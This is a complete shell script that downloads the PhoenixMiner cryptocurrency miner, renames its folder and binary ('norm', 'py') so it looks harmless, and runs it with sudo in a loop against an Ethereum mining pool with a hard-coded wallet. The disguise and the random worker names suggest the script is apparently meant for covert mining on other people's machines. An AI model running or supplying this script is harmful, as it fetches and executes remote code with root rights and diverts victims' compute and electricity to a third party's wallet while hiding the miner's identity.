#!/bin/sh
apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
x=1
mkdir neo
cd neo
wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux
mv PhoenixMiner_5.6d_Linux norm && cd norm
mv PhoenixMiner py
while [ $x -le 20 ]
do

  sudo ./py -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400


  x=$(( $x + 1 ))
  sleep 120
  echo "All done with $x times"
done
